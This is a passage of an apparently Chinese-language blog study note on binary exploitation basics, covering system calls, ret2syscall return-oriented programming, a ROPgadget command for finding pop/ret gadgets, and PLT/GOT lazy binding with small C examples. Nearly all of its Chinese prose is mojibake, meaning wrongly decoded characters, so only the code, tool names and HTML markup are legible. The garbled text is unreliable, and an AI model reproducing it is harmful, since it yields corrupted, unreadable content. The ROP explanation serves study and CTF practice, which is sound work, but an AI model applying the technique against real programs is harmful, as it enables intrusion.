ä¸ºæœ‰åé—¨å‡½æ•°æˆ–è€…å¯ä»¥æ³¨å…¥shellcodeï¼‰ã€‚è€Œç°åœ¨æ— äº†ã€‚</p><h3 id="ç³»ç»Ÿè°ƒç”¨"><a href="#ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨"></a>ç³»ç»Ÿè°ƒç”¨</h3><ul><li>æ˜¯æ“ä½œç³»ç»Ÿæä¾›ç»™ç”¨æˆ·çš„ç¼–ç¨‹æ¥å£ï¼Œè¿™äº›æ¥å£å¯ä»¥è¢«é“¾æ¥åº“å°è£…æˆä¸€ä¸ªå‡½æ•°ã€‚</li><li>æ˜¯<strong>æä¾›è®¿é—®æ“ä½œç³»ç»Ÿæ‰€ç®¡ç†çš„åº•å±‚ç¡¬ä»¶çš„æ¥å£</strong></li><li>æœ¬è´¨ä¸Šæ˜¯ä¸€äº›å†…æ ¸ï¼ˆKernelï¼‰å‡½æ•°ä»£ç ï¼Œä»¥è§„èŒƒçš„æ–¹æ³•é©±åŠ¨ç¡¬ä»¶</li><li>x86é€šè¿‡int 0x80æŒ‡ä»¤è¿›è¡Œç³»ç»Ÿè°ƒç”¨ã€amd64é€šè¿‡syscallæŒ‡ä»¤è¿›è¡Œç³»ç»Ÿè°ƒç”¨</li></ul><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">my_puts</span><span class="params">()</span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, shellcode, <span class="number">0x100</span>); <span class="comment">//è¿™ä¸ªwriteå…¶å®æ˜¯åŠ¨æ€é“¾æ¥åº“å¸®å¿™å°è£…å¥½çš„å‡½æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€ä¸ªä»£ç ï¼Œåœ¨<strong>æ“ä½œç³»ç»Ÿå±‚é¢</strong>æ˜¯å¦‚ä½•å®ç°çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov eax, xx</span><br><span class="line"></span><br><span class="line">mov ebx, xx;èµ‹å€¼è¦è¾“å‡ºçš„ä¸œä¸œ</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h3 id="åŠ¨æ€é“¾æ¥åº“"><a href="#åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="åŠ¨æ€é“¾æ¥åº“"></a>åŠ¨æ€é“¾æ¥åº“</h3><p>ä»€ä¹ˆæ˜¯åŠ¨æ€é“¾æ¥åº“ï¼Ÿ</p><p>ä½¿ç”¨<code>ldd</code>æŒ‡ä»¤å¯ä»¥çœ‹åˆ°ä½¿ç”¨åˆ°çš„æ‰€æœ‰é“¾æ¥åº“</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126221633861.png" alt="image-20241126221633861"></p><p>æœ€ä¸‹é¢çš„é‚£ä¸œè¥¿ï¼ŒæŠŠæˆ‘ä»¬æ‰€éœ€è¦çš„æ‰€æœ‰åŠ¨æ€é“¾æ¥åº“ï¼Œæ–‡ä»¶ï¼Œå…¨éƒ¨<strong>è£…è½½åˆ°shared library</strong>ä¸­ã€‚</p><p>æˆ‘ä»¬è¦å…³æ³¨çš„æ˜¯<code>libc.so</code>ã€‚è¿™æ˜¯ä¸€ä¸ª<strong>è½¯é“¾æ¥</strong>ï¼Œä¸æ˜¯ä¸€ä¸ªå…·ä½“çš„å®ç°ã€‚</p><p><strong>ä»€ä¹ˆæ˜¯è½¯é“¾æ¥ï¼Ÿ</strong></p><p>è¿™å¥½æ¯”æˆ‘ä»¬çš„å¿«æ·æ–¹å¼ã€‚ä¸ç®¡è¿™ä¸ªåº”ç”¨ç¨‹åºå‘ç”Ÿäº†ä»€ä¹ˆæ ·çš„æ”¹å˜ï¼Œåªè¦ä½ç½®æ²¡å˜ï¼Œè¿™ä¸ªå¿«æ·æ–¹å¼å°±å¯ä»¥æ‰“å¼€è¿™ä¸ªåº”ç”¨ç¨‹åºã€‚ç›¸æ¯”ä¹‹ï¼ŒåŠ¨æ€é“¾æ¥åº“ä¹Ÿæ˜¯åœ¨ä¸æ–­æ›´æ–°çš„ï¼Œlibc.soå°±å……å½“äº†è¿™ä¸ªä»£åäººã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126222805442.png" alt="image-20241126222805442"></p><p>è¿™é‡Œæ²¡ç»‘å®šåŠ¨æ€é“¾æ¥åº“å•Šã€‚</p><p>å¦‚æœç»‘å®šäº†å°±å¯ä»¥ç›´æ¥æ‰§è¡Œï¼Œç›¸å½“äºç›´æ¥æ‰§è¡Œè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“</p><p>ç®€è€Œè¨€ä¹‹ï¼Œ<strong>åŠ¨æ€é“¾æ¥åº“å°±æ˜¯å­˜æ”¾åœ¨libç›®å½•çš„ä¸€äº›å¯æ‰§è¡Œæ–‡ä»¶</strong>è€Œå·²ï¼Œè¿™äº›åº“é‡Œé¢å·²ç»åŒ…å«äº†å¤§é‡çš„å·²ç»å†™å¥½çš„Cè¯­è¨€ä»£ç ã€‚</p><p>è€Œ<strong>è½¯é“¾æ¥å°±æ˜¯åŠ¨æ€é“¾æ¥åº“çš„ä¸€ä¸ªå¿«æ·æ–¹å¼</strong></p><p>åŒæ ·çœ‹ä¸Šé¢é‚£ä¸ªwriteçš„ä¾‹å­ï¼Œåœ¨æ‰§è¡Œç¨‹åºçš„æ—¶å€™ï¼Œæ‰§è¡Œæµä¸ºï¼š</p><p><code>my_puts()</code>&#x3D;&#x3D;&gt;<code>write()</code>&#x3D;&#x3D;&gt;<code>sys_write()</code></p><p>ä»<strong>Text</strong>åˆ°<strong>shared library</strong>å†åˆ°<strong>Kernel</strong></p><p>å„ä¸ªå‡½æ•°éƒ½æœ‰å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå¦‚writeçš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯4 ã€‚writeå‡½æ•°æ˜¯å¯¹sys_writeè¿™æ ·ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„ä¸€ä¸ªå°è£…</p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><h5 id="ä¸€ä¸ªé‡è¦çš„ç³»ç»Ÿè°ƒç”¨"><a href="#ä¸€ä¸ªé‡è¦çš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ä¸€ä¸ªé‡è¦çš„ç³»ç»Ÿè°ƒç”¨"></a>ä¸€ä¸ªé‡è¦çš„ç³»ç»Ÿè°ƒç”¨</h5><p><code>execve</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126224956779.png" alt="image-20241126224956779"> </p><p>åˆ†æç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ï¼š</p><p>é¦–å…ˆèµ‹å€¼ä¸€ä¸ª<strong>ç³»ç»Ÿè°ƒç”¨å·</strong>ï¼ˆ<strong>eax</strong>ï¼‰    ï¼ˆexecevçš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯11ï¼‰</p><p><strong>ebxï¼Œecxï¼Œedxä¿å­˜ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°</strong></p><p>intï¼ˆinterruptï¼‰ä¸­æ–­ï¼Œ<strong>0x80ä»£è¡¨çš„å°±æ˜¯ç³»ç»Ÿè°ƒç”¨</strong></p><p>æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆçŸ¥é“è¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åæŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨å·çœ‹çœ‹è¿™æ˜¯å“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åä¼ é€’å‚æ•°æ‰§è¡Œ</p><p>åªéœ€è¦è¿™å‡ æ¡æ±‡ç¼–ä»£ç å°±å¯ä»¥å¾—åˆ°shellï¼Œä½†ç°å®å¾€å¾€ä¸ä¼šç™½ç™½å°†è¿™äº›ä»£ç è¿ç»­å¾—å†™åˆ°ç¨‹åºä¸­ã€‚</p><p>ä¸è¿‡ï¼Œæœ‰è¿™äº›ç¨‹åºç‰‡æ®µä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>è¿™å°±æ˜¯<strong>ROP</strong></p><p><strong>è®©åˆ†ç¦»çš„ä»£ç è¿ç»­æ‰§è¡Œï¼Œè¾¾åˆ°å¯¹åº”çš„æ•ˆæœ</strong></p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241127094818640.png" alt="image-20241127094818640" style="zoom:67%;"><p>å·¦è¾¹æ˜¯ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ã€‚åŸæ¥çš„åŸºç¡€æ ˆæº¢å‡ºåªéœ€è¦è¿”å›åˆ°åé—¨å‡½æ•°æˆ–æ˜¯æŸä¸€ä¸ªç‰¹å®šä½ç½®å°±å¯ä»¥äº†ã€‚</p><p>å¦‚ä»Šè¿™ä¸ªè¿”å›åœ°å€æ˜¯ä¸€ä¸ª<strong>é“¾çŠ¶</strong>çš„ç»“æ„å¦‚ä»Šè¦æ‰§è¡Œå››ä¸ªä¸åŒç‰‡æ®µï¼ˆ<strong>gadget</strong>ï¼‰çš„ä»£ç ï¼Œæ‰€ä»¥è¦è·³è½¬å››æ¬¡ã€‚</p><p>è¿™ä¸ª<strong>gadget</strong>å°±æ˜¯è¿™ç§ï¼Œå…ˆpopï¼ˆæˆ–movï¼Œleaï¼‰ä¸€ä¸ªæ•°æ®ç»™åˆ°å¯„å­˜å™¨ï¼Œå†retçš„å‡½æ•°</p><p>ä¸è¿‡popæ¯”è¾ƒå¥½ç”¨ã€‚åŸå› espå¯ä»¥è‡ªåŠ¨å‘ä¸Šç§»ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªIPåœ°å€ã€‚</p><p>ï¼ˆè¿™ä¸ªè¿˜çœŸåƒé“¾è¡¨ï¼Œæ•°æ®æˆå‘˜ä½œä¸ºå‡½æ•°å‚æ•°ï¼ŒæŒ‡é’ˆæˆå‘˜æŒ‡å‘ä¸‹ä¸€ä¸ªæ‰§è¡Œçš„åœ°å€ï¼‰</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241127190339914.png" alt="image-20241127190339914" style="zoom:50%;"> <p>payloadå°±åƒæ˜¯ä¸€ä¸ªä¸ªgadgetæ­èµ·æ¥çš„æ‹¼å›¾</p><h5 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h5><p>ä½¿ç”¨è¿™ä¸ªå·¥å…·å¯ä»¥æ‰¾åˆ°éœ€è¦çš„æŒ‡ä»¤ä»¥åŠå®ƒçš„åœ°å€</p><p>å³æ‰¾åˆ°æˆ‘ä»¬çš„gadget</p><p><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241127185035223.png" alt="image-20241127185035223"> </p><p>éå¸¸deå¥½ç”¨</p><h5 id="æ‰§è¡Œæµç¨‹"><a href="#æ‰§è¡Œæµç¨‹" class="headerlink" title="æ‰§è¡Œæµç¨‹"></a>æ‰§è¡Œæµç¨‹</h5><p>gadgetæ˜¯movï¼Œretæˆ–æ˜¯pop ï¼Œretéƒ½å¯ä»¥ã€‚åªè¦æœ€åæœ‰ä¸ªretå°±å¯ä»¥æ— é™æ‰§è¡Œä¸‹å»ã€‚</p><p>å› ä¸ºretå¯ä»¥<strong>æ”¹å˜ç¨‹åºçš„æ‰§è¡Œæµ</strong>ï¼ˆIP ï¼‰ã€‚æˆ‘ä»¬åªéœ€è¦å°†ä¸€ç³»åˆ—è¿”å›åœ°å€æˆ–è€…æ•°æ®æº¢å‡ºåˆ°æ ˆä¸­ï¼Œå°±å¯ä»¥ä¸æ–­è·³è·ƒåœ¨å„ä¸ªgadgetä¸­ã€‚</p><ol><li>æ ˆæº¢å‡ºï¼Œè®©è¿”å›åœ°å€ç¬¬ä¸€ä¸ªgadget</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128141239882.png" alt="image-20241128141239882"></p><ol start="2"><li>æ‰§è¡Œç¬¬ä¸€ä¸ªgadgetã€‚å°†espæŒ‡å‘çš„å…ƒç´ èµ‹å€¼ç»™edxï¼Œespè‡ªå¢æŒ‡å‘æ–°çš„è¿”å›åœ°å€</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128141455136.png" alt="image-20241128141455136"></p><ol start="3"><li>æ‰§è¡Œç¬¬äºŒä¸ªgadgetã€‚å°†eaxæ¸…ç©ºï¼Œè¿”å›espæ‰€æŒ‡å‘çš„åœ°å€</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128141630872.png" alt="image-20241128141630872"></p><p>æœ€ç»ˆæ‰§è¡Œè¿‡ç¨‹å°±åƒè¿™æ ·</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128143137143.png" alt="image-20241128143137143" style="zoom:67%;"> <p>åœ¨æ ˆä¸­æº¢å‡ºä¸€ç³»åˆ—çš„è¿”å›åœ°å€ï¼Œé“¾å¼æ‰§è¡Œä¸€ç³»åˆ—çš„gadgetã€‚æœ€åæ‰§è¡Œint 0x80æŒ‡ä»¤ï¼ŒæˆåŠŸæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ã€‚è¿™æ ·å°±è¾¾åˆ°äº†æ”»å‡»çš„ç›®çš„ã€‚</p><p>å›¾ä¸­æœ€åä»Textæ®µåˆ°Kernelä¸­æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><h4 id="åŠ¨æ€é“¾æ¥-vs-é™æ€é“¾æ¥"><a href="#åŠ¨æ€é“¾æ¥-vs-é™æ€é“¾æ¥" class="headerlink" title="åŠ¨æ€é“¾æ¥ vs é™æ€é“¾æ¥"></a>åŠ¨æ€é“¾æ¥ vs é™æ€é“¾æ¥</h4><p>åŠ¨æ€é“¾æ¥ï¼šå°†ç”¨åˆ°çš„åº“å‡½æ•°æ ‡è®°ä¸€ä¸‹ã€‚åŠ¨æ€é“¾æ¥æ˜¯åœ¨è£…è½½ï¼ˆä»å¯æ‰§è¡Œæ–‡ä»¶åˆ°è¿›ç¨‹æ˜ åƒï¼‰çš„æ—¶å€™æ‰å¯è§ã€‚ç¨‹åºè£…è½½è¿›å…¥å†…å­˜æ—¶åŠ è½½åº“ä»£ç è§£æå¤–éƒ¨å¼•ç”¨</p><p>é™æ€é“¾æ¥ï¼šæœ¬èº«å°†åº“å‡½æ•°å…¨éƒ¨å†™å…¥elfæ–‡ä»¶æœ¬èº«ã€‚é™æ€é“¾æ¥åœ¨é“¾æ¥ï¼ˆä»ç›®æ ‡æ–‡ä»¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼‰æ—¶å¯è§ã€‚é“¾æ¥å™¨åœ¨ç¼–è¯‘é“¾æ¥æ—¶å°†åº“ä»£ç åŠ å…¥å¯æ‰§è¡Œæ–‡ä»¶ä¸­</p><p>æ‰€ä»¥ä¸¤ç§æ–‡ä»¶å¤§å°å·®è·å¾ˆå¤§ã€‚å·®çš„å°±æ˜¯åº“çš„å†…å®¹ </p><p>å¯ä»¥åœ¨idaä¸­çœ‹çœ‹ä¸¤ç§ä¸åŒæ–¹å¼ä¸­çš„å‡½æ•°æ•°é‡</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317212557028.png" alt="image-20250317212557028"></p><p>åƒè¿™ç§ç²‰è‰²èƒŒæ™¯çš„å‡½æ•°ï¼Œéƒ½æ˜¯åœ¨ç¨‹åºä¸­æ²¡æœ‰å…·ä½“å®ç°ï¼Œåªæ˜¯ä¸€ä¸ªç¬¦å·è€Œå·²ã€‚è¿™ä¸ªç¬¦å·æ˜¯ç”¨æ¥è§£æå‡½æ•°åœ¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„ä½ç½®ã€‚å¾€å¾€ä¸€ä¸ªåŠ¨æ€é“¾æ¥è¿˜è¦è°ƒç”¨æ›´åº•å±‚çš„ä¸€äº›åŠ¨æ€é“¾æ¥ã€‚</p><p>æ‰€ä»¥ret2syscallè¿™é¢˜è¦ç”¨é™æ€é“¾æ¥ï¼Œç”¨æ¥æä¾›è¶³å¤Ÿçš„gadget</p><h3 id="åŠ¨æ€é“¾æ¥çš„ç›¸å…³ç»“æ„"><a href="#åŠ¨æ€é“¾æ¥çš„ç›¸å…³ç»“æ„" class="headerlink" title="åŠ¨æ€é“¾æ¥çš„ç›¸å…³ç»“æ„"></a>åŠ¨æ€é“¾æ¥çš„ç›¸å…³ç»“æ„</h3><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317213827354.png" alt="image-20250317213827354" style="zoom:50%;"><ul><li><p>dynamic sectionï¼šæä¾›åŠ¨æ€é“¾æ¥ç›¸å…³ä¿¡æ¯ã€‚åŒ…æ‹¬æ•´ä¸ªåŠ¨æ€é“¾æ¥çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å…¶ä»–çš„è¡¨ï¼Œä½ç½®ï¼Œå¦‚ä½•ç»„ç»‡</p></li><li><p>link_mapï¼šä¿å­˜è¿›ç¨‹è½½å…¥çš„åŠ¨æ€é“¾æ¥åº“çš„é“¾è¡¨ã€‚é™¤äº†åŸºæœ¬çš„åŠ¨æ€é“¾æ¥åº“ï¼Œå¯èƒ½è½½å…¥äº†å…¶ä»–çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™äº›æ‰€æœ‰çš„åŠ¨æ€é“¾æ¥åº“æ‰€å½¢æˆçš„å¯æ‰§è¡Œæ–‡ä»¶å°±ä¼šåœ¨lnik_mapä¸­å½¢æˆä¸€ä¸ªé“¾è¡¨</p></li><li><p>dl_runtime_resolveï¼šæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè§£æç¬¬ä¸€æ¬¡åœ¨åŠ¨æ€é“¾æ¥çš„ç¨‹åºä¸­æ‰§è¡Œçš„å‡½æ•°çš„çœŸå®åœ°å€ã€‚ç”±pltè°ƒç”¨ï¼Œå‘gotå†™å…¥çœŸæ­£åœ°å€çš„å†…å®¹</p></li><li><p>.got sectionï¼šå…¨å±€åç§»é‡è¡¨ï¼Œä¿å­˜äº†å…¨å±€çš„å˜é‡</p></li><li><p>.got.plt sectionï¼šä¿å­˜äº†å‡½æ•°çš„åœ°å€</p></li></ul><h3 id="åŠ¨æ€é“¾æ¥è¿‡ç¨‹"><a href="#åŠ¨æ€é“¾æ¥è¿‡ç¨‹" class="headerlink" title="åŠ¨æ€é“¾æ¥è¿‡ç¨‹"></a>åŠ¨æ€é“¾æ¥è¿‡ç¨‹</h3><p>ä¾‹å­ï¼šè°ƒç”¨libcä¸­çš„fooå‡½æ•°</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317220404709.png" alt="image-20250317220404709" style="zoom:67%;"><p>textæ˜¯ä»£ç èŠ‚</p><p>fooæ˜¯æˆ‘ä»¬å†™çš„è‡ªå®šä¹‰å‡½æ•°</p><p>pltæ˜¯ç¨‹åºä¸­ä»£ç æ®µè§£æå‡½æ•°çœŸå®åœ°å€çš„ä¸€ä¸ªèŠ‚</p><p>ï¼ˆå‡è®¾libcä¸­æœ‰ä¸€ä¸ªfooå‡½æ•°ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">foo();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ±‡ç¼–ä¸­è°ƒç”¨ä¸€ä¸ªç”¨æˆ·å‡½æ•°ä¼šè¿›è¡Œä¸€ä¸ªcallæŒ‡ä»¤ã€‚æ‰€ä»¥å°±ä¼šæœ‰ä¸€ä¸ªcall foo</p><p>å› ä¸ºfooæ˜¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ä¸­çš„ä»£ç ã€‚æ‰€ä»¥call fooä¸èƒ½å¤Ÿç›´æ¥è·³è½¬åˆ°å®ƒè‡ªå·±çš„ä»£ç æ®µé‡Œçš„åº“é‡Œã€‚å®é™…ä¸Šåœ¨libc.soé‡Œçš„ä¸€æ®µã€‚ä½†ä¹Ÿä¸èƒ½ç›´æ¥è·³åˆ°libcé‡Œï¼Œå› ä¸ºä¸çŸ¥é“å…·ä½“ä½ç½®</p><p>codeæ®µé‡Œè¿˜æœ‰ä¸€ä¸ªpltèŠ‚ï¼ˆæ‰€ä»¥pltæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€äº›ä»£ç ï¼‰ã€‚æ¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ä¸­è°ƒç”¨çš„å‡½æ•°ï¼Œéƒ½ä¼šåœ¨pltèŠ‚ä¸­åˆ›å»ºä¸€ä¸ªè¡¨é¡¹ã€‚</p><p>ç¬¬ä¸€æ¬¡è°ƒç”¨fooæ—¶å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317221821855.png" alt="image-20250317221821855"></p><p>pltä¸­å­˜å‚¨fooå‡½æ•°çš„è¡¨é¡¹ä½ç½®ï¼Œé€šè¿‡æ­¤å†ä»gotè¡¨å–å¾—fooçš„çœŸå®åœ°å€ã€‚ä½†æ˜¯ç”±äºæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨fooå‡½æ•°ï¼Œgotè¡¨å¹¶æ²¡æœ‰ç»è¿‡ç‰¹æ®Šå‡½æ•°è§£æï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰å¡«å†™çœŸå®åœ°å€ã€‚æ­¤æ—¶å¡«å†™è¡¨é¡¹ä½ç½®ï¼Œä»gotè¡¨è·³å›äº†pltä½ç½®ã€‚è¿™ä¸ªæ—¶å€™pltè¡¨å°±çŸ¥é“äº†gotè¡¨æ²¡æœ‰çœŸå®åœ°å€ï¼Œå¹¶å¼€å§‹å¯»æ‰¾fooå‡½æ•°çš„çœŸå®åœ°å€ï¼Œå¡«å…¥gotè¡¨ä¸­ã€‚</p><p>å†å›åˆ°æœ€ä¸Šé¢çš„é‚£å¼ å›¾ã€‚</p><p>jmpåˆ°gotè¡¨å‘ç°æ²¡ä¸œè¥¿ï¼Œäºæ˜¯å›åˆ°pltè¡¨ã€‚æ‰§è¡Œä¸‹æ–¹æŒ‡ä»¤</p><p>é¦–å…ˆpush indexã€‚è¿™ä¸ªindexå°±æ˜¯åœ¨pltè¡¨ä¸­è°ƒç”¨å‡½æ•°å¯¹åº”çš„ç´¢å¼•ã€‚å¦‚ä¸Šå›¾ä¸ºä¾‹ï¼Œfooå‡½æ•°çš„indexå°±æ˜¯3ã€‚è¿™é‡Œçš„æ„æ€å°±æ˜¯è¯´æˆ‘è¦è§£æçš„æ˜¯pltè¡¨ä¸­çš„ç¬¬3ä¸ªå‡½æ•°ã€‚</p><p>æ¥ç€push *(GOT + 4)ã€‚è¡¨ç¤ºè¦å»å“ªä¸ªåŠ¨æ€é“¾æ¥åº“å»æ‰¾éœ€è¦çš„å†…å®¹ã€‚æ¥ç€jmp (GOT + 8 )è¿›å…¥dl_resolveå‡½æ•°ã€‚å¦‚ä¸‹å›¾</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317223129869.png" alt="image-20250317223129869" style="zoom:50%;"><p>æ­¤æ—¶dl_runtime_resolveå‡½æ•°è§£æfooçš„çœŸæ­£åœ°å€å¡«å…¥.got.pltä¸­</p><p>è§£æè¿‡ç¨‹å°±ä¸è¯´äº†</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317223325220.png" alt="image-20250317223325220" style="zoom:50%;"><p>è§£æå®Œæ¯•åï¼Œå°±å°†fooå‡½æ•°çœŸå®åœ°å€çš„å€¼å¡«å…¥gotè¡¨ä¸­</p><p>å¦‚æœå˜ä¸ºç¬¬äºŒæ¬¡è°ƒç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317223500836.png" alt="image-20250317223500836"></p><p>æ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317223706098.png" alt="image-20250317223706098"></p><p>ç°æ–°å†™ä¸€ä¸ªç¨‹åºï¼Œå¹¶ä½¿ç”¨åŠ¨æ€é“¾æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&#x27;first!&#x27;</span>);</span><br><span class="line">x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;second!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;once&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨idaä¸­çœ‹çœ‹pltè¡¨</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318084206153.png" alt="image-20250318084206153" style="zoom:50%;"><p>ç´¢å¼•0è¿™å—å°±æ˜¯putçš„è¡¨é¡¹ã€ç´¢å¼•1è¿™å—å°±æ˜¯printfçš„è¡¨é¡¹ã€ç´¢å¼•2è¿™å—å°±æ˜¯exitçš„è¡¨é¡¹</p><p>æ¯ä¸ªè¡¨é¡¹çš„é•¿åº¦éƒ½æ˜¯16å­—èŠ‚</p><p>åœ¨pwndbgä¸­è¾“å…¥pltå³å¯æŸ¥çœ‹pltè¡¨ï¼Œæˆ–è€…ä½¿ç”¨äºŒè¿›åˆ¶æŸ¥çœ‹pltå†…å®¹ å¦‚ x&#x2F;20 &lt;pltçš„åœ°å€&gt;</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318084411838.png" alt="image-20250318084411838"></p><p>pltå­˜åœ¨textèŠ‚æˆ–initèŠ‚è¿™äº›ä»£ç ä¸­ï¼Œä½œä¸ºæ•°æ®å­˜åœ¨çš„gotèŠ‚å’Œgot.pltèŠ‚ï¼Œåœ¨dataæ®µä¸­</p><p>åœ¨idaä¸­çœ‹çœ‹gotè¡¨</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318085135125.png" alt="image-20250318085135125"></p><p>è¿™ä¸ªgotè¡¨å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…ƒç´ é•¿åº¦ä½8å­—èŠ‚ï¼ˆ64ä½ç¨‹åºåœ°å€é•¿åº¦ï¼‰ã€‚æ¯ä¸€ä¸ªè¡¨é¡¹å°±æ˜¯åœ°å€è€Œå·²ã€‚</p><p>ç›´æ¥è¾“å…¥pltå¯ä»¥çœ‹åˆ°ä¸‰ä¸ªè¡¨é¡¹</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318085412814.png" alt="image-20250318085412814" style="zoom:50%;"><p>ä¸€ä¸ªè¡¨é¡¹æ˜¯åå…­ä¸ªå­—èŠ‚</p><p>å†è¾“å…¥got</p><p>è¿™é‡Œæ˜¯ç¨‹åºåˆšåˆšå¼€å§‹è¿è¡Œçš„æ—¶å€™</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250318085506819.png" alt="image-20250318085506819"></p><p>å‘Šè¯‰æˆ‘ä»¬gotè¡¨ä¸­å­˜äº†ä¸‰ä¸ªå‡½æ•°ï¼Œæ¯ä¸ªå‡½æ•°8å­—èŠ‚ã€‚æ¯ä¸ªåœ°å€éƒ½æ˜¯0x000000000040â€¦â€¦ï¼Œå¹¶ä¸”å‘Šè¯‰äº†æˆ‘ä»¬å†pltè¡¨ä¸­å¯¹åº”çš„ç´¢å¼•</p><p>è¿™ä¸ªåœ°å€å¯¹åº”ä»£ç 